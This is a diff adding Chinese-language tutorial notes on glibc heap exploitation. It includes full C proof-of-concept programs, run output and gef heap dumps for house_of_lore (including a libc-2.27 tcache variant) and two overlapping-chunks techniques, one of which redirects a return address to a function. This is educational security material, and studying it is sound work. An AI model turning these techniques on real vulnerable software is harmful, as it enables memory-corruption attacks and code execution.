@@ -932,10 +932,12 @@ New b2 content:BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 >   |-------|---------------|-------|   之后的 malloc 操作没有更新 C 的 prev_size
 >   初始状态，B大小为0x210，C的prev_size为0x210
 >   释放B，B进入unsorted bin，通过溢出将B的size修改为0x200，
->   
->   
->   
+>   ```
+>
+> 
+>
 >            0x180  0x80
+>
 >   |-------|------|-----|--|-------|
 >   |   A   |  B1  | B2  |  |   C   |   malloc(0x180-8), malloc(0x80-8)
 >   |-------|------|-----|--|-------|
@@ -946,7 +948,7 @@ New b2 content:BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 >   |   A   |  B1  | B2  |  |   C   |   malloc(0x180-8)
 >   |-------|------|-----|--|-------|   B2 将被覆盖
 >           |<实际得到的块>|
->           
+>
 >   其后申请0x180给B1，会从B中切0x180
 >   剩下的0x80形成新的chunk B2（依旧在bin中）
 >   分配器只会更新B2的prev_size为0x180，它不会去修改C的prev_size
@@ -955,10 +957,10 @@ New b2 content:BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 >   此时释放C，系统通过索引C的prev_size找到B1，并通过标志位发现可以向前合并
 >   于是B、C的整个内存合成了一个大的unsorted bin
 >   重新申请chunk时，会从这个unsorted bin中切割，可以造成与B2的堆叠
+>
 >   ```
->
 > - house of einherjar：也是溢出字节只能为 0 的情况，当它是**更新溢出块下一块的 prev_size 字段**，使其在被释放时能够找到之前一个合法的被释放块并与其合并，造成堆块重叠
->
+> 
 >   ```text
 >     0x100   0x100   0x101
 >   |-------|-------|-------|
@@ -1116,4 +1118,1011 @@ gef➤  heap bins small
 还有个事情值得注意，在分配 chunk d 时，由于在 unsorted bin 中没有找到适合的 chunk，malloc 就将 unsorted bin 中的 chunk 都整理回各自的 bins 中了，这里就是 small bins。
 
 最后，继续看 libc-2.26 上的情况，还是一样的，处理好 tchache 就可以了，把两种大小的 tcache bin 都占满。
+
+
+
+
+
+### house_of_lore
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+
+void jackpot(){ puts("Nice jump d00d"); exit(0); }
+
+int main() {
+    intptr_t *victim = malloc(0x80);
+    memset(victim, 'A', 0x80);
+    void *p5 = malloc(0x10);
+    memset(p5, 'A', 0x10);
+    intptr_t *victim_chunk = victim - 2;
+    fprintf(stderr, "Allocated the victim (small) chunk: %p\n", victim);
+
+    intptr_t* stack_buffer_1[4] = {0};
+    intptr_t* stack_buffer_2[3] = {0};
+    stack_buffer_1[0] = 0;
+    stack_buffer_1[2] = victim_chunk;
+    stack_buffer_1[3] = (intptr_t*)stack_buffer_2;
+    stack_buffer_2[2] = (intptr_t*)stack_buffer_1;
+    fprintf(stderr, "stack_buffer_1: %p\n", (void*)stack_buffer_1);
+    fprintf(stderr, "stack_buffer_2: %p\n\n", (void*)stack_buffer_2);
+
+    free((void*)victim);
+    fprintf(stderr, "Freeing the victim chunk %p, it will be inserted in the unsorted bin\n", victim);
+    fprintf(stderr, "victim->fd: %p\n", (void *)victim[0]);
+    fprintf(stderr, "victim->bk: %p\n\n", (void *)victim[1]);
+
+    void *p2 = malloc(0x100);
+    fprintf(stderr, "Malloc a chunk that can't be handled by the unsorted bin, nor the SmallBin: %p\n", p2);
+    fprintf(stderr, "The victim chunk %p will be inserted in front of the SmallBin\n", victim);
+    fprintf(stderr, "victim->fd: %p\n", (void *)victim[0]);
+    fprintf(stderr, "victim->bk: %p\n\n", (void *)victim[1]);
+
+    victim[1] = (intptr_t)stack_buffer_1;
+    fprintf(stderr, "Now emulating a vulnerability that can overwrite the victim->bk pointer\n");
+
+    void *p3 = malloc(0x40);
+    char *p4 = malloc(0x80);
+    memset(p4, 'A', 0x10);
+    fprintf(stderr, "This last malloc should return a chunk at the position injected in bin->bk: %p\n", p4);
+    fprintf(stderr, "The fd pointer of stack_buffer_2 has changed: %p\n\n", stack_buffer_2[2]);
+
+    intptr_t sc = (intptr_t)jackpot;
+    memcpy((p4+40), &sc, 8);
+}
+```
+
+
+
+```c
+$ gcc -g house_of_lore.c
+$ ./a.out
+Allocated the victim (small) chunk: 0x1b2e010
+stack_buffer_1: 0x7ffe5c570350
+stack_buffer_2: 0x7ffe5c570330
+
+Freeing the victim chunk 0x1b2e010, it will be inserted in the unsorted bin
+victim->fd: 0x7f239d4c9b78
+victim->bk: 0x7f239d4c9b78
+
+Malloc a chunk that can't be handled by the unsorted bin, nor the SmallBin: 0x1b2e0c0
+The victim chunk 0x1b2e010 will be inserted in front of the SmallBin
+victim->fd: 0x7f239d4c9bf8
+victim->bk: 0x7f239d4c9bf8
+
+Now emulating a vulnerability that can overwrite the victim->bk pointer
+This last malloc should return a chunk at the position injected in bin->bk: 0x7ffe5c570360
+The fd pointer of stack_buffer_2 has changed: 0x7f239d4c9bf8
+
+Nice jump d00d
+```
+
+接下来，我们要尝试伪造一条 small bins 链。
+
+首先创建两个 chunk，第一个是我们的 victim chunk，请确保它是一个 small chunk，第二个随意，只是为了确保在 free 时 victim chunk 不会被合并进 top chunk 里。然后，在栈上伪造两个 fake chunk，让 fake chunk 1 的 fd 指向 victim chunk，bk 指向 fake chunk 2；fake chunk 2 的 fd 指向 fake chunk 1，这样一个 small bin 链就差不多了：
+
+```c
+gef➤  x/26gx victim-2
+0x603000:    0x0000000000000000    0x0000000000000091  <-- victim chunk
+0x603010:    0x4141414141414141    0x4141414141414141
+0x603020:    0x4141414141414141    0x4141414141414141
+0x603030:    0x4141414141414141    0x4141414141414141
+0x603040:    0x4141414141414141    0x4141414141414141
+0x603050:    0x4141414141414141    0x4141414141414141
+0x603060:    0x4141414141414141    0x4141414141414141
+0x603070:    0x4141414141414141    0x4141414141414141
+0x603080:    0x4141414141414141    0x4141414141414141
+0x603090:    0x0000000000000000    0x0000000000000021  <-- chunk p5
+0x6030a0:    0x4141414141414141    0x4141414141414141
+0x6030b0:    0x0000000000000000    0x0000000000020f51  <-- top chunk
+0x6030c0:    0x0000000000000000    0x0000000000000000
+gef➤  x/10gx &stack_buffer_2
+0x7fffffffdc30:    0x0000000000000000    0x0000000000000000  <-- fake chunk 2
+0x7fffffffdc40:    0x00007fffffffdc50    0x0000000000400aed      <-- fd->fake chunk 1
+0x7fffffffdc50:    0x0000000000000000    0x0000000000000000  <-- fake chunk 1
+0x7fffffffdc60:    0x0000000000603000    0x00007fffffffdc30      <-- fd->victim chunk, bk->fake chunk 2
+0x7fffffffdc70:    0x00007fffffffdd60    0x7c008088c400bc00
+```
+
+
+
+molloc 中对于 small bin 链表的检查是通过对bin中第二块chunk的bk指针是否指向第一块，来发现对small bins的破坏，因此，为了绕过检查，我需要同时伪造bin中前两个chunk
+
+```c
+          [...]
+
+          else
+            {
+              bck = victim->bk;
+    if (__glibc_unlikely (bck->fd != victim))
+                {
+                  errstr = "malloc(): smallbin double linked list corrupted";
+                  goto errout;
+                }
+              set_inuse_bit_at_offset (victim, nb);
+              bin->bk = bck;
+              bck->fd = bin;
+
+              [...]
+```
+
+接下来释放掉 victim chunk，它会被放到 unsoted bin 中，且 fd/bk 均指向 unsorted bin 的头部：
+
+```c
+gef➤  x/26gx victim-2
+0x603000:    0x0000000000000000    0x0000000000000091  <-- victim chunk [be freed]
+0x603010:    0x00007ffff7dd1b78    0x00007ffff7dd1b78      <-- fd, bk pointer
+0x603020:    0x4141414141414141    0x4141414141414141
+0x603030:    0x4141414141414141    0x4141414141414141
+0x603040:    0x4141414141414141    0x4141414141414141
+0x603050:    0x4141414141414141    0x4141414141414141
+0x603060:    0x4141414141414141    0x4141414141414141
+0x603070:    0x4141414141414141    0x4141414141414141
+0x603080:    0x4141414141414141    0x4141414141414141
+0x603090:    0x0000000000000090    0x0000000000000020  <-- chunk p5
+0x6030a0:    0x4141414141414141    0x4141414141414141
+0x6030b0:    0x0000000000000000    0x0000000000020f51  <-- top chunk
+0x6030c0:    0x0000000000000000    0x0000000000000000
+gef➤  heap bins unsorted
+[ Unsorted Bin for arena 'main_arena' ]
+[+] unsorted_bins[0]: fw=0x603000, bk=0x603000
+ →   Chunk(addr=0x603010, size=0x90, flags=PREV_INUSE)
+```
+
+这时，申请一块大的 chunk，只需要大到让 malloc 在 unsorted bin 中找不到合适的就可以了。这样原本在 unsorted bin 中的 chunk，会被整理回各自的所属的 bins 中，这里就是 small bins：
+
+```c
+gef➤  heap bins small
+[ Small Bins for arena 'main_arena' ]
+[+] small_bins[8]: fw=0x603000, bk=0x603000
+ →   Chunk(addr=0x603010, size=0x90, flags=PREV_INUSE)
+```
+
+接下来是最关键的一步，假设存在一个漏洞，可以让我们修改 victim chunk 的 bk 指针。那么就修改 bk 让它指向我们在栈上布置的 fake small bin：
+
+```c
+gef➤  x/26gx victim-2
+0x603000:    0x0000000000000000    0x0000000000000091  <-- victim chunk [be freed]
+0x603010:    0x00007ffff7dd1bf8    0x00007fffffffdc50      <-- bk->fake chunk 1
+0x603020:    0x4141414141414141    0x4141414141414141
+0x603030:    0x4141414141414141    0x4141414141414141
+0x603040:    0x4141414141414141    0x4141414141414141
+0x603050:    0x4141414141414141    0x4141414141414141
+0x603060:    0x4141414141414141    0x4141414141414141
+0x603070:    0x4141414141414141    0x4141414141414141
+0x603080:    0x4141414141414141    0x4141414141414141
+0x603090:    0x0000000000000090    0x0000000000000020  <-- chunk p5
+0x6030a0:    0x4141414141414141    0x4141414141414141
+0x6030b0:    0x0000000000000000    0x0000000000000111  <-- chunk p2
+0x6030c0:    0x0000000000000000    0x0000000000000000
+gef➤  x/10gx &stack_buffer_2
+0x7fffffffdc30:    0x0000000000000000    0x0000000000000000  <-- fake chunk 2
+0x7fffffffdc40:    0x00007fffffffdc50    0x0000000000400aed      <-- fd->fake chunk 1
+0x7fffffffdc50:    0x0000000000000000    0x0000000000000000  <-- fake chunk 1
+0x7fffffffdc60:    0x0000000000603000    0x00007fffffffdc30     <-- fd->victim chunk, bk->fake chunk 2
+0x7fffffffdc70:    0x00007fffffffdd60    0x7c008088c400bc00
+```
+
+我们知道 small bins 是先进后出的，节点的增加发生在链表头部，而删除发生在尾部。这时整条链是这样的：
+
+```c
+HEAD(undefined) <-> fake chunk 2 <-> fake chunk 1 <-> victim chunk <-> TAIL
+
+fd: ->
+bk: <-
+```
+
+fake chunk 2 的 bk 指向了一个未定义的地址，如果能通过内存泄露等手段，拿到 HEAD 的地址并填进去，整条链就闭合了。当然这里完全没有必要这么做。
+
+接下来的第一个 malloc，会返回 victim chunk 的地址，如果 malloc 的大小正好等于 victim chunk 的大小，那么情况会简单一点。但是这里我们不这样做，malloc 一个小一点的地址，可以看到，malloc 从 small bin 里取出了末尾的 victim chunk，切了一块返回给 chunk p3，然后把剩下的部分放回到了 unsorted bin。同时 small bin 变成了这样：
+
+```c
+HEAD(undefined) <-> fake chunk 2 <-> fake chunk 1 <-> TAIL
+    
+    
+
+gef➤  x/26gx victim-2
+0x603000:    0x0000000000000000    0x0000000000000051  <-- chunk p3
+0x603010:    0x00007ffff7dd1bf8    0x00007fffffffdc50
+0x603020:    0x4141414141414141    0x4141414141414141
+0x603030:    0x4141414141414141    0x4141414141414141
+0x603040:    0x4141414141414141    0x4141414141414141
+0x603050:    0x4141414141414141    0x0000000000000041  <-- unsorted bin
+0x603060:    0x00007ffff7dd1b78    0x00007ffff7dd1b78      <-- fd, bk pointer
+0x603070:    0x4141414141414141    0x4141414141414141
+0x603080:    0x4141414141414141    0x4141414141414141
+0x603090:    0x0000000000000040    0x0000000000000020  <-- chunk p5
+0x6030a0:    0x4141414141414141    0x4141414141414141
+0x6030b0:    0x0000000000000000    0x0000000000000111  <-- chunk p2
+0x6030c0:    0x0000000000000000    0x0000000000000000
+gef➤  x/10gx &stack_buffer_2
+0x7fffffffdc30:    0x0000000000000000    0x0000000000000000  <-- fake chunk 2
+0x7fffffffdc40:    0x00007fffffffdc50    0x0000000000400aed      <-- fd->fake chunk 1
+0x7fffffffdc50:    0x0000000000000000    0x0000000000000000  <-- fake chunk 1
+0x7fffffffdc60:    0x00007ffff7dd1bf8    0x00007fffffffdc30      <-- fd->TAIL, bk->fake chunk 2
+0x7fffffffdc70:    0x00007fffffffdd60    0x7c008088c400bc00
+gef➤  heap bins unsorted
+[ Unsorted Bin for arena 'main_arena' ]
+[+] unsorted_bins[0]: fw=0x603050, bk=0x603050
+ →   Chunk(addr=0x603060, size=0x40, flags=PREV_INUSE)    
+```
+
+
+
+最后，再次 malloc 将返回 fake chunk 1 的地址，地址在栈上且我们能够控制。同时 small bin 变成这样：
+
+```c
+HEAD(undefined) <-> fake chunk 2 <-> TAIL
+    
+    
+    
+    
+gef➤  x/10gx &stack_buffer_2
+0x7fffffffdc30:    0x0000000000000000    0x0000000000000000  <-- fake chunk 2
+0x7fffffffdc40:    0x00007ffff7dd1bf8    0x0000000000400aed      <-- fd->TAIL
+0x7fffffffdc50:    0x0000000000000000    0x0000000000000000  <-- chunk 4
+0x7fffffffdc60:    0x4141414141414141    0x4141414141414141
+0x7fffffffdc70:    0x00007fffffffdd60    0x7c008088c400bc00
+```
+
+于是我们就成功地骗过了 malloc 在栈上分配了一个 chunk
+
+heap-use-after-free，所以上面我们用于修改 bk 指针的漏洞，应该就是一个 UAF 吧，当然溢出也是可以的
+
+
+
+#### libc-2.27 版本
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+
+void jackpot(){ puts("Nice jump d00d"); exit(0); }
+
+int main() {
+    intptr_t *victim = malloc(0x80);
+
+    // fill the tcache
+    int *a[10];
+    int i;
+    for (i = 0; i < 7; i++) {
+        a[i] = malloc(0x80);
+    }
+    for (i = 0; i < 7; i++) {
+        free(a[i]);
+    }
+
+    memset(victim, 'A', 0x80);
+    void *p5 = malloc(0x10);
+    memset(p5, 'A', 0x10);
+    intptr_t *victim_chunk = victim - 2;
+    fprintf(stderr, "Allocated the victim (small) chunk: %p\n", victim);
+
+    intptr_t* stack_buffer_1[4] = {0};
+    intptr_t* stack_buffer_2[6] = {0};
+    stack_buffer_1[0] = 0;
+    stack_buffer_1[2] = victim_chunk;
+    stack_buffer_1[3] = (intptr_t*)stack_buffer_2;
+    stack_buffer_2[2] = (intptr_t*)stack_buffer_1;
+    stack_buffer_2[3] = (intptr_t*)stack_buffer_1;    // 3675 bck->fd = bin;
+
+    fprintf(stderr, "stack_buffer_1: %p\n", (void*)stack_buffer_1);
+    fprintf(stderr, "stack_buffer_2: %p\n\n", (void*)stack_buffer_2);
+
+    free((void*)victim);
+    fprintf(stderr, "Freeing the victim chunk %p, it will be inserted in the unsorted bin\n", victim);
+    fprintf(stderr, "victim->fd: %p\n", (void *)victim[0]);
+    fprintf(stderr, "victim->bk: %p\n\n", (void *)victim[1]);
+
+    void *p2 = malloc(0x100);
+    fprintf(stderr, "Malloc a chunk that can't be handled by the unsorted bin, nor the SmallBin: %p\n", p2);
+    fprintf(stderr, "The victim chunk %p will be inserted in front of the SmallBin\n", victim);
+    fprintf(stderr, "victim->fd: %p\n", (void *)victim[0]);
+    fprintf(stderr, "victim->bk: %p\n\n", (void *)victim[1]);
+
+    victim[1] = (intptr_t)stack_buffer_1;
+    fprintf(stderr, "Now emulating a vulnerability that can overwrite the victim->bk pointer\n");
+
+    void *p3 = malloc(0x40);
+
+    // empty the tcache
+    for (i = 0; i < 7; i++) {
+        a[i] = malloc(0x80);
+    }
+
+    char *p4 = malloc(0x80);
+    memset(p4, 'A', 0x10);
+    fprintf(stderr, "This last malloc should return a chunk at the position injected in bin->bk: %p\n", p4);
+    fprintf(stderr, "The fd pointer of stack_buffer_2 has changed: %p\n\n", stack_buffer_2[2]);
+
+    intptr_t sc = (intptr_t)jackpot;
+    memcpy((p4+0xa8), &sc, 8);
+}
+```
+
+```c
+$ gcc -g house_of_lore.c
+$ ./a.out
+Allocated the victim (small) chunk: 0x55674d75f260
+stack_buffer_1: 0x7ffff71fb1d0
+stack_buffer_2: 0x7ffff71fb1f0
+
+Freeing the victim chunk 0x55674d75f260, it will be inserted in the unsorted bin
+victim->fd: 0x7f1eba392b00
+victim->bk: 0x7f1eba392b00
+
+Malloc a chunk that can't be handled by the unsorted bin, nor the SmallBin: 0x55674d75f700
+The victim chunk 0x55674d75f260 will be inserted in front of the SmallBin
+victim->fd: 0x7f1eba392b80
+victim->bk: 0x7f1eba392b80
+
+Now emulating a vulnerability that can overwrite the victim->bk pointer
+This last malloc should return a chunk at the position injected in bin->bk: 0x7ffff71fb1e0
+The fd pointer of stack_buffer_2 has changed: 0x7ffff71fb1e0
+
+Nice jump d00d
+```
+
+
+
+
+
+### overlapping_chunks
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+
+int main() {
+    intptr_t *p1,*p2,*p3,*p4;
+
+    p1 = malloc(0x90 - 8);
+    p2 = malloc(0x90 - 8);
+    p3 = malloc(0x80 - 8);
+    memset(p1, 'A', 0x90 - 8);
+    memset(p2, 'A', 0x90 - 8);
+    memset(p3, 'A', 0x80 - 8);
+    fprintf(stderr, "Now we allocate 3 chunks on the heap\n");
+    fprintf(stderr, "p1=%p\np2=%p\np3=%p\n\n", p1, p2, p3);
+
+    free(p2);
+    fprintf(stderr, "Freeing the chunk p2\n");
+
+    int evil_chunk_size = 0x111;
+    int evil_region_size = 0x110 - 8;
+    *(p2-1) = evil_chunk_size; // Overwriting the "size" field of chunk p2
+    fprintf(stderr, "Emulating an overflow that can overwrite the size of the chunk p2.\n\n");
+
+    p4 = malloc(evil_region_size);
+    fprintf(stderr, "p4: %p ~ %p\n", p4, p4+evil_region_size);
+    fprintf(stderr, "p3: %p ~ %p\n", p3, p3+0x80);
+
+    fprintf(stderr, "\nIf we memset(p4, 'B', 0xd0), we have:\n");
+    memset(p4, 'B', 0xd0);
+    fprintf(stderr, "p4 = %s\n", (char *)p4);
+    fprintf(stderr, "p3 = %s\n", (char *)p3);
+
+    fprintf(stderr, "\nIf we memset(p3, 'C', 0x50), we have:\n");
+    memset(p3, 'C', 0x50);
+    fprintf(stderr, "p4 = %s\n", (char *)p4);
+    fprintf(stderr, "p3 = %s\n", (char *)p3);
+}
+```
+
+```c
+$ gcc -g overlapping_chunks.c
+$ ./a.out
+Now we allocate 3 chunks on the heap
+p1=0x1e2b010
+p2=0x1e2b0a0
+p3=0x1e2b130
+
+Freeing the chunk p2
+Emulating an overflow that can overwrite the size of the chunk p2.
+
+p4: 0x1e2b0a0 ~ 0x1e2b8e0
+p3: 0x1e2b130 ~ 0x1e2b530
+
+If we memset(p4, 'B', 0xd0), we have:
+p4 = BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
+p3 = BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
+
+If we memset(p3, 'C', 0x50), we have:
+p4 = BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
+p3 = CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
+```
+
+这个比较简单，就是堆块重叠的问题。通过一个溢出漏洞，改写 unsorted bin 中空闲堆块的 size，改变下一次 malloc 可以返回的堆块大小。
+
+首先分配三个堆块，然后释放掉中间的一个：
+
+```c
+gef➤  x/60gx 0x602010-0x10
+0x602000:    0x0000000000000000    0x0000000000000091  <-- chunk 1
+0x602010:    0x4141414141414141    0x4141414141414141
+0x602020:    0x4141414141414141    0x4141414141414141
+0x602030:    0x4141414141414141    0x4141414141414141
+0x602040:    0x4141414141414141    0x4141414141414141
+0x602050:    0x4141414141414141    0x4141414141414141
+0x602060:    0x4141414141414141    0x4141414141414141
+0x602070:    0x4141414141414141    0x4141414141414141
+0x602080:    0x4141414141414141    0x4141414141414141
+0x602090:    0x4141414141414141    0x0000000000000091  <-- chunk 2 [be freed]
+0x6020a0:    0x00007ffff7dd1b78    0x00007ffff7dd1b78
+0x6020b0:    0x4141414141414141    0x4141414141414141
+0x6020c0:    0x4141414141414141    0x4141414141414141
+0x6020d0:    0x4141414141414141    0x4141414141414141
+0x6020e0:    0x4141414141414141    0x4141414141414141
+0x6020f0:    0x4141414141414141    0x4141414141414141
+0x602100:    0x4141414141414141    0x4141414141414141
+0x602110:    0x4141414141414141    0x4141414141414141
+0x602120:    0x0000000000000090    0x0000000000000080  <-- chunk 3
+0x602130:    0x4141414141414141    0x4141414141414141
+0x602140:    0x4141414141414141    0x4141414141414141
+0x602150:    0x4141414141414141    0x4141414141414141
+0x602160:    0x4141414141414141    0x4141414141414141
+0x602170:    0x4141414141414141    0x4141414141414141
+0x602180:    0x4141414141414141    0x4141414141414141
+0x602190:    0x4141414141414141    0x4141414141414141
+0x6021a0:    0x4141414141414141    0x0000000000020e61  <-- top chunk
+0x6021b0:    0x0000000000000000    0x0000000000000000
+0x6021c0:    0x0000000000000000    0x0000000000000000
+0x6021d0:    0x0000000000000000    0x0000000000000000
+gef➤  heap bins unsorted
+[ Unsorted Bin for arena 'main_arena' ]
+[+] unsorted_bins[0]: fw=0x602090, bk=0x602090
+ →   Chunk(addr=0x6020a0, size=0x90, flags=PREV_INUSE)
+```
+
+chunk 2 被放到了 unsorted bin 中，其 size 值为 0x90。
+
+接下来，假设我们有一个溢出漏洞，可以改写 chunk 2 的 size 值，比如这里我们将其改为 0x111，也就是原本 chunk 2 和 chunk 3 的大小相加，最后一位是 1 表示 chunk 1 是在使用的，其实有没有都无所谓。
+
+```c
+gef➤  heap bins unsorted
+[ Unsorted Bin for arena 'main_arena' ]
+[+] unsorted_bins[0]: fw=0x602090, bk=0x602090
+ →   Chunk(addr=0x6020a0, size=0x110, flags=PREV_INUSE)
+```
+
+这时 unsorted bin 中的数据也更改了。
+
+接下来 malloc 一个大小的等于 chunk 2 和 chunk 3 之和的 chunk 4，这会将 chunk 2 和 chunk 3 都包含进来：
+
+```c
+gef➤  x/60gx 0x602010-0x10
+0x602000:    0x0000000000000000    0x0000000000000091  <-- chunk 1
+0x602010:    0x4141414141414141    0x4141414141414141
+0x602020:    0x4141414141414141    0x4141414141414141
+0x602030:    0x4141414141414141    0x4141414141414141
+0x602040:    0x4141414141414141    0x4141414141414141
+0x602050:    0x4141414141414141    0x4141414141414141
+0x602060:    0x4141414141414141    0x4141414141414141
+0x602070:    0x4141414141414141    0x4141414141414141
+0x602080:    0x4141414141414141    0x4141414141414141
+0x602090:    0x4141414141414141    0x0000000000000111  <-- chunk 4
+0x6020a0:    0x00007ffff7dd1b78    0x00007ffff7dd1b78
+0x6020b0:    0x4141414141414141    0x4141414141414141
+0x6020c0:    0x4141414141414141    0x4141414141414141
+0x6020d0:    0x4141414141414141    0x4141414141414141
+0x6020e0:    0x4141414141414141    0x4141414141414141
+0x6020f0:    0x4141414141414141    0x4141414141414141
+0x602100:    0x4141414141414141    0x4141414141414141
+0x602110:    0x4141414141414141    0x4141414141414141
+0x602120:    0x0000000000000090    0x0000000000000080  <-- chunk 3
+0x602130:    0x4141414141414141    0x4141414141414141
+0x602140:    0x4141414141414141    0x4141414141414141
+0x602150:    0x4141414141414141    0x4141414141414141
+0x602160:    0x4141414141414141    0x4141414141414141
+0x602170:    0x4141414141414141    0x4141414141414141
+0x602180:    0x4141414141414141    0x4141414141414141
+0x602190:    0x4141414141414141    0x4141414141414141
+0x6021a0:    0x4141414141414141    0x0000000000020e61  <-- top chunk
+0x6021b0:    0x0000000000000000    0x0000000000000000
+0x6021c0:    0x0000000000000000    0x0000000000000000
+0x6021d0:    0x0000000000000000    0x0000000000000000
+```
+
+这样，相当于 chunk 4 和 chunk 3 就重叠了，两个 chunk 可以互相修改对方的数据。就像上面的运行结果打印出来的那样。
+
+
+
+### overlapping_chunks_2
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+#include <malloc.h>
+
+int main() {
+    intptr_t *p1,*p2,*p3,*p4,*p5,*p6;
+    unsigned int real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6;
+    int prev_in_use = 0x1;
+
+    p1 = malloc(0x10);
+    p2 = malloc(0x80);
+    p3 = malloc(0x80);
+    p4 = malloc(0x80);
+    p5 = malloc(0x10);
+    real_size_p1 = malloc_usable_size(p1);
+    real_size_p2 = malloc_usable_size(p2);
+    real_size_p3 = malloc_usable_size(p3);
+    real_size_p4 = malloc_usable_size(p4);
+    real_size_p5 = malloc_usable_size(p5);
+    memset(p1, 'A', real_size_p1);
+    memset(p2, 'A', real_size_p2);
+    memset(p3, 'A', real_size_p3);
+    memset(p4, 'A', real_size_p4);
+    memset(p5, 'A', real_size_p5);
+    fprintf(stderr, "Now we allocate 5 chunks on the heap\n\n");
+    fprintf(stderr, "chunk p1: %p ~ %p\n", p1, (unsigned char *)p1+malloc_usable_size(p1));
+    fprintf(stderr, "chunk p2: %p ~ %p\n", p2, (unsigned char *)p2+malloc_usable_size(p2));
+    fprintf(stderr, "chunk p3: %p ~ %p\n", p3, (unsigned char *)p3+malloc_usable_size(p3));
+    fprintf(stderr, "chunk p4: %p ~ %p\n", p4, (unsigned char *)p4+malloc_usable_size(p4));
+    fprintf(stderr, "chunk p5: %p ~ %p\n", p5, (unsigned char *)p5+malloc_usable_size(p5));
+
+    free(p4);
+    fprintf(stderr, "\nLet's free the chunk p4\n\n");
+
+    fprintf(stderr, "Emulating an overflow that can overwrite the size of chunk p2 with (size of chunk_p2 + size of chunk_p3)\n\n");
+    *(unsigned int *)((unsigned char *)p1 + real_size_p1) = real_size_p2 + real_size_p3 + prev_in_use + sizeof(size_t) * 2; // BUG HERE
+
+    free(p2);
+
+    p6 = malloc(0x1b0 - 0x10);
+    real_size_p6 = malloc_usable_size(p6);
+    fprintf(stderr, "Allocating a new chunk 6: %p ~ %p\n\n", p6, (unsigned char *)p6+real_size_p6);
+
+    fprintf(stderr, "Now p6 and p3 are overlapping, if we memset(p6, 'B', 0xd0)\n");
+    fprintf(stderr, "p3 before = %s\n", (char *)p3);
+    memset(p6, 'B', 0xd0);
+    fprintf(stderr, "p3 after  = %s\n", (char *)p3);
+}
+$ gcc -g overlapping_chunks_2.c
+$ ./a.out
+Now we allocate 5 chunks on the heap
+
+chunk p1: 0x18c2010 ~ 0x18c2028
+chunk p2: 0x18c2030 ~ 0x18c20b8
+chunk p3: 0x18c20c0 ~ 0x18c2148
+chunk p4: 0x18c2150 ~ 0x18c21d8
+chunk p5: 0x18c21e0 ~ 0x18c21f8
+
+Let's free the chunk p4
+
+Emulating an overflow that can overwrite the size of chunk p2 with (size of chunk_p2 + size of chunk_p3)
+
+Allocating a new chunk 6: 0x18c2030 ~ 0x18c21d8
+
+Now p6 and p3 are overlapping, if we memset(p6, 'B', 0xd0)
+p3 before = AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
+p3 after  = BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
+```
+
+同样是堆块重叠的问题，前面那个是在 chunk 已经被 free，加入到了 unsorted bin 之后，再修改其 size 值，然后 malloc 一个不一样的 chunk 出来，而这里是在 free 之前修改 size 值，使 free 错误地修改了下一个 chunk 的 prev_size 值，导致中间的 chunk 强行合并。另外前面那个重叠是相邻堆块之间的，而这里是不相邻堆块之间的。
+
+我们需要五个堆块，假设第 chunk 1 存在溢出，可以改写第二个 chunk 2 的数据，chunk 5 的作用是防止释放 chunk 4 后被合并进 top chunk。所以我们要重叠的区域是 chunk 2 到 chunk 4。首先将 chunk 4 释放掉，注意看 chunk 5 的 prev_size 值：
+
+```c
+gef➤  x/70gx 0x602010-0x10
+0x602000:    0x0000000000000000    0x0000000000000021  <-- chunk 1
+0x602010:    0x4141414141414141    0x4141414141414141
+0x602020:    0x4141414141414141    0x0000000000000091  <-- chunk 2
+0x602030:    0x4141414141414141    0x4141414141414141
+0x602040:    0x4141414141414141    0x4141414141414141
+0x602050:    0x4141414141414141    0x4141414141414141
+0x602060:    0x4141414141414141    0x4141414141414141
+0x602070:    0x4141414141414141    0x4141414141414141
